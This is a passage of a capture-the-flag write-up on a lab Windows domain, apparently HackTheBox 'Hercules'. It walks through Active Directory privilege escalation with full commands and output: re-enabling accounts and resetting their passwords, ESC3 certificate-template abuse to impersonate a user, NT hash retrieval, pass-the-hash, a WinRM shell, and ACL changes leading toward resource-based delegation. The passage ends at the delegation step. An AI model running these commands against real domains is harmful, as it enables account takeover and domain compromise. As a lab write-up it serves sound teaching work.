This membership is significant because **Smartcard Operators** can have permissions related to certificate-based authentication and **Active Directory Certificate Services (AD CS)**. In environments where AD CS is misconfigured, these privileges can often be leveraged to gain higher levels of access through certificate-based attacks, making `Fernando.R` a valuable target for further privilege escalation.

## Enumerating User Accounts in the `Forest Migration` OU

After identifying `Fernando.R` in the **Forest Migration** OU, I enumerated the remaining user accounts within the same container to determine whether any of them were privileged or otherwise interesting. As part of the enumeration, I inspected the `adminCount` attribute, which is commonly set to **1** for protected accounts, and the `UserAccountControl` attribute to identify whether accounts were enabled, disabled, or configured with specific security flags.

To retrieve this information, I queried all user objects in the **Forest Migration** OU while collecting the relevant attributes using the following command:

```powershell
PS C:\Users\auditor\Documents> Get-ADUser -SearchBase "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -Filter * `
  -Properties adminCount,UserAccountControl | Where-Object { ($_.adminCount -ne 1) -or ($_.adminCount -eq $null) } | Select-Object SamAccountName,Distinguish
edName,adminCount,UserAccountControl

SamAccountName DistinguishedName                                                          adminCount UserAccountControl
-------------- -----------------                                                          ---------- ------------------
james.s        CN=James Silver,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                               66050
anthony.r      CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                               66050
taylor.m       CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                             66050
fernando.r     CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                         66050
```

The enumeration returned four user accounts within the **Forest Migration** OU:

* `james.s`
* `anthony.r`
* `taylor.m`
* `fernando.r`

None of these accounts had the `adminCount` attribute set to **1**, indicating that they are not protected administrative accounts. While this rules out direct Domain Admin privileges, they may still be useful for later attack paths.

All four users shared the same `UserAccountControl` value of **66050**, suggesting they have a similar configuration. This consistent setting indicates that the accounts are likely part of a migrated or legacy user group, supporting the idea that the **Forest Migration** OU serves as a staging area for older or inactive accounts.

## Re-Activating the `fernando.r` Account

Earlier enumeration revealed that `fernando.r` was located in the **Forest Migration** OU but was currently disabled. Because I had already obtained full control over the OU, I was able to manage the accounts it contained. The next step was to re-enable `fernando.r` so the account could be used in subsequent attacks.

Using `bloodyAD` and my existing **Kerberos** session as **Auditor**, I cleared the `ACCOUNTDISABLE` flag from `fernando.r`**'s** `userAccountControl` attribute with the following command:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=Auditor.ccache bloodyad --host DC.hercules.htb -d 'hercules.htb' -u 'auditor' -k remove uac 'fernando.r' -f ACCOUNTDISABLE
[+] ['ACCOUNTDISABLE'] property flags removed from fernando.r's userAccountControl
```

The operation successfully re-enabled the `fernando.r` account, allowing it to authenticate to the domain once again. Since **Fernando** is a member of the **Smartcard Operators** group, restoring the account significantly expands the available attack surface, particularly for certificate-based authentication and other smartcard-related techniques.

With the account now active, `fernando.r` became a usable foothold that could be leveraged in the next phase of the privilege escalation process.

After clearing the `ACCOUNTDISABLE` flag from `fernando.r`, I verified that the modification had been applied successfully and that the account was now active. To confirm this, I queried **Active Directory** for Fernando's user object.

From my **PowerShell** session, I executed the following command:

```powershell
PS C:\Users\auditor\Documents> Get-ADUser -Identity "Fernando.R"
DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : True
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb
```

The query returned **Fernando's** Active Directory object within the **Forest Migration** OU and confirmed that the account had been successfully re-enabled:

```text
Enabled : True
```

This verified that the update to the `userAccountControl` attribute was applied correctly. With the account now active, `fernando.r` could authenticate to the domain using its assigned **User Principal Name (UPN)**, `fernando.r@hercules.htb`, just like any other enabled domain user.

## Resetting the `fernando.r` Account Password

After re-enabling `fernando.r`, the next objective was to gain direct access to the account. Since the **Auditor** account had the required permissions, I reset **Fernando's** password, allowing me to authenticate as him and take advantage of any privileges associated with his account.

Using my existing **Kerberos** ticket stored in `Auditor.ccache`, I executed the following command to assign a new password to `fernando.r`:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=Auditor.ccache bloodyad --host DC.hercules.htb -d hercules.htb -u Auditor -k set password 'fernando.r' 'NewPassword1234!'
[+] Password changed successfully!
```

With the password reset complete, `fernando.r` was fully under my control. The account was now enabled, and I possessed valid credentials to authenticate directly as **Fernando**.

Controlling this account was particularly valuable because of its membership in the **Smartcard Operators** group. This provided a strong foundation for the next stage of the attack, where I could leverage Fernando's delegated privileges to continue escalating access within the domain.

## Authenticating as `fernando.r` and Obtaining a Kerberos TGT

After taking control of the `fernando.r` account, I verified the new credentials by requesting a **Kerberos Ticket Granting Ticket (TGT)**. Instead of performing an interactive logon, I used **Impacket** to authenticate directly with the Domain Controller and obtain a Kerberos ticket for the account.

Successfully requesting a TGT would confirm that the password reset had taken effect and provide a reusable Kerberos ticket for subsequent operations.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ impacket-getTGT 'HERCULES.HTB/fernando.r:NewPassword1234!'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in fernando.r.ccache
```

## Enumerating Active Directory Certificate Services (AD CS)

After successfully authenticating as `fernando.r` and exporting the account's **Kerberos** ticket, I turned my attention to **Active Directory Certificate Services (AD CS)**. Because **Fernando** is a member of the **Smartcard Operators** group, certificate services became a natural area to investigate for potential privilege escalation opportunities.

Using `fernando.r`**'s** Kerberos ticket from the credential cache, I enumerated the domain's certificate authorities and certificate templates with **Certipy**, filtering the results to highlight vulnerable AD CS configurations.

```shell
KRB5CCNAME=fernando.r.ccache certipy-ad find -k -dc-ip 10.129.242.196 -target DC.hercules.htb -vulnerable -stdout
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FETT74BMDqv3oQLocblbz%252FScreenshot%2520%282824%29.png%3Falt%3Dmedia%26token%3Dbfa9237f-a5da-4cfa-99e4-49475d5f74ed&width=768&dpr=3&quality=100&sign=7e6598d3&sv=2)

In this step, I used **Certipy** to authenticate with **Kerberos** (`-k`), connect directly to the **Domain Controller**, and enumerate only certificate templates with known AD CS misconfigurations.

The enumeration revealed a single **Enterprise Certificate Authority**, **CA-HERCULES**, hosted on `dc.hercules.htb`. Although web enrollment over HTTP/HTTPS was disabled, certificate requests could still be submitted through **RPC**, so enrollment remained possible. The results also showed that **Authenticated Users** were permitted to enroll for certificates, increasing the potential attack surface for certificate-based abuse.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FPBfR2npi6aQHDHVEhsDr%252FScreenshot%2520%282825%29.png%3Falt%3Dmedia%26token%3D846af490-94a8-487a-9d10-a2b7913dbcbd&width=768&dpr=3&quality=100&sign=af879a5a&sv=2)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FhhdWbX7t66b2hCnZVQlj%252FScreenshot%2520%282826%29.png%3Falt%3Dmedia%26token%3D2bcb2a75-b0f1-4168-a865-2458dac18f58&width=768&dpr=3&quality=100&sign=f7341d5d&sv=2)

Certipy identified **18** enabled certificate templates and reported several that were vulnerable. Among them, three templates were particularly noteworthy:

* `MachineEnrollmentAgent`
* `EnrollmentAgentOffline`
* `EnrollmentAgent`

Each of these templates includes the **Certificate Request Agent** extended key usage, making them vulnerable to the **ESC3** attack technique. With this configuration, users who are allowed to enroll in these templates can request certificates on behalf of other domain users.

The enumeration also showed that members of the **Smartcard Operators** group have enrollment permissions for these templates. Since `fernando.r` belongs to this group, the account has the necessary rights to abuse these vulnerable certificate templates in the next stage of the attack.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FnxRRLpFoJUrSzKIHLttf%252FScreenshot%2520%282827%29.png%3Falt%3Dmedia%26token%3D83f20b9f-3c71-45c4-b8eb-c09aadc1ff5b&width=768&dpr=3&quality=100&sign=77e428a4&sv=2)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FsJVh6pVfAgPbA4XlfXYB%252FScreenshot%2520%282828%29.png%3Falt%3Dmedia%26token%3D33d9cc62-7b49-4d77-ba40-0a0d77e1985a&width=768&dpr=3&quality=100&sign=a3170a67&sv=2)

Because `fernando.r` is a member of the **Smartcard Operators** group, the account is authorized to enroll in these vulnerable templates. This makes it possible to obtain an **Enrollment Agent** certificate, which can then be used to request certificates on behalf of other domain users—a powerful technique for impersonation and privilege escalation.

One template, `EnrollmentAgentOffline`, was also flagged as vulnerable to **ESC15**. The template allows the enrollee to supply the certificate subject and uses a **schema version 1** configuration. In environments that have not been patched for **CVE-2024-49019**, this combination can introduce additional certificate abuse opportunities. Although exploitation depends on the target's patch level, the finding further demonstrates that the AD CS deployment contains multiple security misconfigurations.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FvoeIdYgz799cPHGDKCRa%252FScreenshot%2520%282829%29.png%3Falt%3Dmedia%26token%3D5c4c32bd-72ea-448a-8261-7302c1d48910&width=768&dpr=3&quality=100&sign=4eb21543&sv=2)

Because `fernando.r` belongs to the **Smartcard Operators** group, the account has permission to enroll in the vulnerable **Enrollment Agent** templates. This creates a straightforward path to impersonate higher-privileged users through certificate-based attacks.

Based on these findings, **Active Directory Certificate Services (AD CS)** became the primary privilege escalation path for the remainder of the assessment.

## Enumerating Active Directory Certificate Services with Certipy

With valid Kerberos authentication as **fernando.r**, I proceeded to perform a full enumeration of Active Directory Certificate Services to better understand the certificate landscape in the domain and identify any additional attack paths that might not be immediately obvious from a vulnerability-only scan.

Using Fernando’s Kerberos ticket from the cache, I ran Certipy without restricting the output to vulnerable templates so I could capture a complete picture of the CA configuration:

```shell
KRB5CCNAME=fernando.r.ccache certipy-ad find -k -no-pass -dc-ip 10.129.11.157 -target dc.hercules.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'CA-HERCULES' via RRP
[*] Successfully retrieved CA configuration for 'CA-HERCULES'
[*] Checking web enrollment for CA 'CA-HERCULES' @ 'dc.hercules.htb'
[*] Saving text output to '20260627091314_Certipy.txt'
[*] Wrote text output to '20260627091314_Certipy.txt'
[*] Saving JSON output to '20260627091314_Certipy.json'
[*] Wrote JSON output to '20260627091314_Certipy.json'
```

The enumeration confirmed that the **HERCULES** domain uses a single Enterprise Certificate Authority, **CA-HERCULES**, hosted on `dc.hercules.htb`. Certipy found **34** certificate templates, **18** of which were enabled, along with **14** certificate issuance policies.

It also successfully retrieved the CA configuration and generated both **text** and **JSON** reports for later reference.

By collecting a complete overview of the AD CS environment, I confirmed the available templates and CA configuration before focusing on the vulnerable templates identified earlier as the primary path for privilege escalation.

## Obtaining an Enrollment Agent Certificate via the `EnrollmentAgent` Template

After confirming that `fernando.r` was fully authenticated and a member of the **Smartcard Operators** group, I proceeded to exploit one of the vulnerable certificate templates identified during the AD CS enumeration. Because the **EnrollmentAgent** template was enabled and permitted enrollment by **Smartcard Operators**, it provided a direct path to obtain an **Enrollment Agent** certificate.

Using the existing **Kerberos** ticket in my credential cache, I submitted a certificate request to **CA-HERCULES**, specifying the **EnrollmentAgent** template and the required application policy.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=fernando.r.ccache certipy-ad req -u fernando.r@hercules.htb -k -no-pass -dc-host dc.hercules.htb -dc-ip 10.129.11.157 -target dc.hercules.htb -target-ip 10.129.11.157 -ca "CA-HERCULES" -template "EnrollmentAgent" -application-policies "Certificate Request Agent"
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'fernando.r@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'
```

The certificate request was sent over **RPC** using **Kerberos** authentication and was immediately approved by the Certificate Authority. The CA issued the certificate with **Request ID 7**, indicating that no manual approval or additional restrictions were required.

Certipy returned a certificate for `fernando.r@hercules.htb`, matching Fernando's account, and saved both the certificate and its private key as a `.pfx` file.

Obtaining this **Enrollment Agent** certificate was a key step in the attack. It allowed me to request certificates on behalf of other domain users, creating a clear path to impersonate higher-privileged accounts through **Active Directory Certificate Services (AD CS)**.

## Requesting a Certificate on Behalf of `ashley.b`

After obtaining an **Enrollment Agent** certificate as `fernando.r`, I leveraged it to request a certificate for another domain user. This demonstrates the impact of the vulnerable AD CS configuration, as an Enrollment Agent certificate can be used to enroll certificates on behalf of other users.

Using the previously issued `fernando.r.pfx` certificate together with my existing **Kerberos** session, I submitted a request for a standard **User** certificate while specifying `ashley.b` as the target identity. The request was sent through **DCOM**, allowing the Certificate Authority to issue a certificate for Ashley without requiring her credentials.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip 10.129.11.157 -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca "CA-HERCULES" -template "User" -pfx fernando.r.pfx -on-behalf-of "HERCULES\\ashley.b" -dcom
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Saving certificate and private key to 'ashley.b.pfx'
[*] Wrote certificate and private key to 'ashley.b.pfx'
```

The request was submitted using `fernando.r`**'s** **Kerberos** session, but instead of requesting a certificate for Fernando, I used the **Enrollment Agent** certificate to request one on behalf of `ashley.b`. Because the **User** template allowed this behavior, the Certificate Authority approved the request without requiring Ashley's credentials.

The CA issued the certificate with **Request ID 8**, and Certipy confirmed that it was issued for `ashley.b@hercules.htb` with the correct object SID. The certificate and its private key were saved locally as `ashley.b.pfx`.

With this certificate, I could authenticate as `ashley.b` using certificate-based authentication, completely bypassing the need to know her password. This provided a straightforward path for further lateral movement and privilege escalation within the domain.

## Authenticating as `ashley.b` Using Certificate-Based Authentication

After obtaining a certificate for `ashley.b`, the next step was to use it for domain authentication. Rather than authenticating with a password, I leveraged the newly issued **PFX** certificate to perform certificate-based authentication against the Domain Controller.

To do this, I used **Certipy**, specifying the Domain Controller and the `ashley.b.pfx` certificate generated in the previous step:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.129.11.157
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```

Certipy verified that the certificate was correctly associated with `ashley.b@hercules.htb` by checking both the **SAN UPN** and the embedded **SID**, confirming that it could be used to authenticate as Ashley.

Using the certificate, I successfully requested a **Kerberos TGT**, proving that certificate-based authentication worked without requiring Ashley's password. The ticket was saved locally as `ashley.b.ccache`, allowing it to be reused with Kerberos-enabled tools.

Certipy also retrieved **Ashley's NTLM hash**, giving me an additional authentication method. At this point, I had full control of the `ashley.b` account through both a valid Kerberos ticket and the account's NTLM hash, completing a successful AD CS-based privilege escalation.

## Requesting a Kerberos TGT for `ashley.b` via Pass-the-Hash

After obtaining `ashley.b`**'s** NTLM hash, I verified that it could be used for **Kerberos** authentication. Instead of using a plaintext password, I performed a **pass-the-hash** attack to request a **Ticket Granting Ticket (TGT)** directly from the Domain Controller.

Using **Impacket**, I supplied Ashley's **NTLM hash** and requested a Kerberos TGT from the Domain Controller with the following command:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ impacket-getTGT -hashes :1e719fbfddd226da74f644eac9df7fd2 hercules.htb/ashley.b@dc.hercules.htb
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ashley.b@dc.hercules.htb.ccache
```

The successful request provided me with a valid **Kerberos** credential cache for `ashley.b`. With this ticket, I could authenticate to Kerberos-enabled services such as **LDAP**, **WinRM**, **SMB**, and **AD CS** without relying on Ashley's password.

At this stage, I had fully transitioned from certificate-based impersonation to native Kerberos authentication, giving me a reusable credential for continued lateral movement and privilege escalation within the domain.

## Establishing a WinRM Session as `ashley.b` Using Kerberos

After obtaining a valid **Kerberos** ticket for `ashley.b`, I verified whether the account could be used to gain remote access to the Domain Controller. Since **WinRM** was available over **HTTPS (port 5986)**, I attempted to authenticate using the existing Kerberos credential cache instead of a password.

To do this, I configured my environment to use **Ashley's** Kerberos ticket and launched `winrmexec` with the following command:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=ashley.b@dc.hercules.htb.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass hercules.htb/ashley.b@dc.hercules.htb
```

After the authentication succeeded, I obtained a **PowerShell** session running as `ashley.b`. A quick inspection of the user's profile under `C:\Users\ashley.b` revealed the usual directories, along with a custom **Scripts** folder and a PowerShell script on the desktop.

I then navigated to the **Desktop** and found a script named `aCleanup.ps1`. Examining its contents showed that its only purpose was to start a scheduled task called `Password Cleanup`.

```powershell
PS C:\Users\ashley.b\Desktop> cat aCleanup.ps1
Start-ScheduledTask -TaskName "Password Cleanup"
```

```powershell
PS C:\Users\ashley.b\Desktop> ./aCleanup.ps1
```
Running the script confirmed that the `ashley.b` account had permission to start scheduled tasks on the system. This provided a stable foothold on the Domain Controller and demonstrated that I could execute actions remotely through **WinRM**.

With this level of access, I was well positioned to continue investigating scheduled tasks and other administrative mechanisms for additional privilege escalation opportunities.

## Delegating Full Control of the `Forest Migration` OU to `IT SUPPORT`

While authenticated as **Auditor** with **Kerberos**, I used my existing privileges over the **Forest Migration** OU to grant another group full control of the container. This created an additional path for managing the OU through the **IT SUPPORT** group.

Using my current Kerberos ticket, I updated the OU's ACL to assign **GenericAll** (full control) permissions to the **IT SUPPORT** group with the following command:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=Auditor.ccache bloodyad --host 'dc.hercules.htb' -d 'hercules.htb' -u 'auditor' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'
[+] IT SUPPORT has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
```

The command completed successfully, confirming that the **IT SUPPORT** group was granted **GenericAll** permissions on the **Forest Migration** OU. As a result, any member of this group can fully manage the objects within the OU, including creating users, resetting passwords, and modifying object attributes.

This change was no longer limited to the **Auditor** account. By delegating full control to **IT SUPPORT**, I established an additional privilege escalation path that could be leveraged later in the attack chain.

## Granting `Auditor` Full Control of the `Forest Migration` OU

To ensure **Auditor** had unrestricted access to the **Forest Migration** OU, I explicitly granted the account **GenericAll** permissions. Although I already had enough privileges to manage objects within the OU, assigning **GenericAll** directly to my user ensured full and consistent control.

Using my existing **Kerberos** ticket, I updated the OU's ACL with the following command to grant **GenericAll** permissions to **Auditor**:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=Auditor.ccache bloodyad --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```

The command completed successfully, confirming that **Auditor** now has **GenericAll** permissions on the **Forest Migration** OU. This provides full control over all objects within the container, including users, groups, and any new objects created there.

With these permissions in place, I can directly manage the OU by resetting passwords, enabling accounts, modifying group memberships, or changing permissions. This established a solid foundation for the next stages of the attack, including abusing dormant accounts and leveraging certificate-based attacks.

## Re-Enabling `IIS_Administrator` for Further Privilege Escalation

After gaining control of the **Forest Migration** OU, I returned to **BloodHound** to identify the next privilege escalation opportunity. It revealed a valuable relationship: `IIS_Administrator` has **ForceChangePassword** rights over the `IIS_WebServers` account. This permission allows the account to reset the target's password without knowing the existing one.

Before I could abuse this relationship, I verified the status of `IIS_Administrator` and found that the account was **disabled**. As a result, it could not authenticate or perform any actions, preventing the attack chain from progressing.

Since I already had the required delegated permissions, I re-enabled the account, restoring its ability to authenticate and making it available for the next stage of the attack. With `IIS_Administrator` active again, I could proceed with abusing its **ForceChangePassword** rights against `IIS_WebServers`.

> **Note:** If the account fails to re-enable with an `insufficientAccessRights` error, the required ACLs were likely not applied correctly. In that case, run `aCleanup.ps1`, repeat the earlier **GenericAll** permission assignment, verify the changes, and then retry enabling the account.

## Re-Activating the `IIS_Administrator` Account

To continue the attack chain, I first needed to restore the `IIS_Administrator` account to an active state. Earlier enumeration showed that the account was **disabled**, preventing it from authenticating or being used for further privilege escalation.

Using my existing **Kerberos** session as **Auditor**, I cleared the `ACCOUNTDISABLE` flag from the `IIS_Administrator` account by executing the following command:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=Auditor.ccache bloodyad --host DC.hercules.htb -d hercules.htb -u 'Auditor' -k remove uac "IIS_Administrator" -f ACCOUNTDISABLE
[+] ['ACCOUNTDISABLE'] property flags removed from IIS_Administrator's userAccountControl
```

With `IIS_Administrator` re-enabled, its delegated permissions and previously identified **BloodHound** attack paths became usable. This cleared the way for the next stage of privilege escalation.

## Resetting the `IIS_Administrator` Account Password

After re-enabling `IIS_Administrator`, I took control of the account by assigning it a new password. Because the **Auditor** account already had the necessary Active Directory permissions, I was able to reset the password without knowing the existing one.

Using my current access, I executed the following command to set a new password for `IIS_Administrator`:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=Auditor.ccache bloodyad --host DC.hercules.htb -d hercules.htb -u 'Auditor' -k set password "IIS_Administrator" "BlahBlah1234*"
[+] Password changed successfully!
```

At this stage, `IIS_Administrator` was fully under my control. The account had been re-enabled, assigned a new password, and was ready to authenticate for the next phase of the attack.

## Requesting a Kerberos TGT for `IIS_Administrator`

With `IIS_Administrator` re-enabled and its password reset, I verified that the account could successfully authenticate to the domain. Instead of performing an interactive logon, I requested a **Kerberos Ticket Granting Ticket (TGT)**, which could be reused to access Kerberos-enabled services without repeatedly providing credentials.

To obtain the TGT, I ran the following command:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ impacket-getTGT hercules.htb/'iis_administrator':'BlahBlah1234*' -dc-ip 10.129.11.157
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in iis_administrator.ccache
```

With this Kerberos ticket, I could authenticate to domain services such as **LDAP**, **SMB**, and **WinRM** without supplying the password again. At this point, I had fully taken over the `IIS_Administrator` account and was ready to continue with the final stages of privilege escalation.

## Resetting the `IIS_WebServer$` Account Password via `ForceChangePassword`

After obtaining a valid **Kerberos** ticket for `IIS_Administrator`, I took advantage of the delegated **ForceChangePassword** permission identified earlier in **BloodHound**. This permission allowed `IIS_Administrator` to reset the password of the `iis_webserver$` computer account without knowing its current password.

Using the existing Kerberos ticket in my credential cache, I executed the following command to assign a new password to the `iis_webserver$` account:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=iis_administrator.ccache bloodyad --host DC.hercules.htb -d hercules.htb -u 'IIS_Administrator' -k set password "iis_webserver$" G0dOfThunder123!
[+] Password changed successfully!
```

The command authenticated as `IIS_Administrator` using **Kerberos** and successfully reset the password of the `iis_webserver$` computer account. This confirmed that the **ForceChangePassword** permission could be abused as expected.

With control of the `iis_webserver$` account, I could now authenticate as the web server itself, providing a new avenue for lateral movement and the final stages of privilege escalation.

## Generating the NTLM Hash from the New Password

After resetting the password for `iis_webserver$`, I generated its corresponding **NTLM (NT)** hash so it could be used with authentication methods that accept hashes, such as **pass-the-hash** or certain **Kerberos** tools.

Using the known plaintext password, I generated the NT hash by running the following command:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ echo -n 'G0dOfThunder123!' | iconv -t UTF-16LE | openssl dgst -md4
MD4(stdin)= 3f350f6bdb4af9a020660a5476598928
```

This command manually generated the **NTLM (NT)** hash from the password `G0dOfThunder123!`. It first converted the password to **UTF-16LE**, the encoding used internally by Windows for NTLM authentication, and then computed its **MD4** hash using **OpenSSL**.

The resulting output:

```text
MD4(stdin)= 3f350f6bdb4af9a020660a5476598928
```

is the NT hash corresponding to the password `G0dOfThunder123!`. With this hash available, I could authenticate as `iis_webserver$` using pass-the-hash techniques or other tools that support NTLM hash authentication, eliminating the need to use the plaintext password in subsequent steps.

## Requesting a Kerberos TGT for `iis_webserver$` via Pass-the-Hash

After generating the **NTLM** hash for the `iis_webserver$` computer account, I verified that it could be used for **Kerberos** authentication. Instead of using the account's plaintext password, I performed a **pass-the-hash** attack to request a **Ticket Granting Ticket (TGT)** directly from the Domain Controller.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ impacket-getTGT -hashes :3f350f6bdb4af9a020660a5476598928 'hercules.htb/IIS_webserver$' -dc-ip 10.129.11.157
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in IIS_webserver$.ccache
```

The successful response confirmed that the **NTLM** hash was valid and could be used to authenticate with **Kerberos**. The issued **TGT** was saved locally, giving me a reusable Kerberos ticket for the `iis_webserver$` account.

With this ticket, I could authenticate as the web server to Kerberos-enabled services and continue the privilege escalation process.

## Examining the Kerberos Ticket Session Key

After obtaining a **Kerberos TGT** for the `iis_webserver$` account, I inspected the ticket to verify that it had been issued correctly and was ready for use.

To do this, I parsed the cached Kerberos ticket and extracted its session key using the following command:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ impacket-describeTicket 'IIS_webserver$.ccache' | grep 'Ticket Session Key'
[*] Ticket Session Key            : a45cf61b2027f5c63407e48a3147a57b
```

This verified that I had a working Kerberos authentication context for the `iis_webserver$` account.

With this ticket, I could continue authenticating to Kerberos-enabled services and proceed with the remaining privilege escalation steps.

## Changing the `iis_webserver$` Password Using Kerberos

With a valid **Kerberos** session for the `iis_webserver$` account, I proceeded to change its password at the domain level. Rather than using the account's plaintext password, I authenticated with the existing Kerberos session and reused the extracted session key.

To update the account password by supplying new **NTLM** hashes, I executed the following command:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ impacket-changepasswd -newhashes :a45cf61b2027f5c63407e48a3147a57b 'hercules.htb'/'IIS_webserver$':'G0dOfThunder123!'@'dc.hercules.htb' -k
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of hercules.htb\IIS_webserver$
[*] Connecting to DCE/RPC as hercules.htb\IIS_webserver$
[-] CCache file is not found. Skipping...
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

The warning about requiring a password change at the next logon is expected when setting NTLM hashes directly and does not prevent the account from being used.

At this stage, I had full control of the `iis_webserver$` account, completing the takeover of the machine account and preparing for the final phase of the attack.

## Exploiting Resource-Based Constrained Delegation (RBCD)

At this point, **BloodHound** revealed the final privilege escalation path: a **Resource-Based Constrained Delegation (RBCD)** misconfiguration between the `iis_webserver$` computer account and the `dc.hercules.htb` domain controller.

The graph showed an **AllowedToAct** relationship from `iis_webserver$` to `dc.hercules.htb`. This means the domain controller trusts the IIS web server to request Kerberos service tickets on behalf of other users for services hosted on the DC. Since I had already taken control of the `iis_webserver$` account, this delegation relationship became directly exploitable.

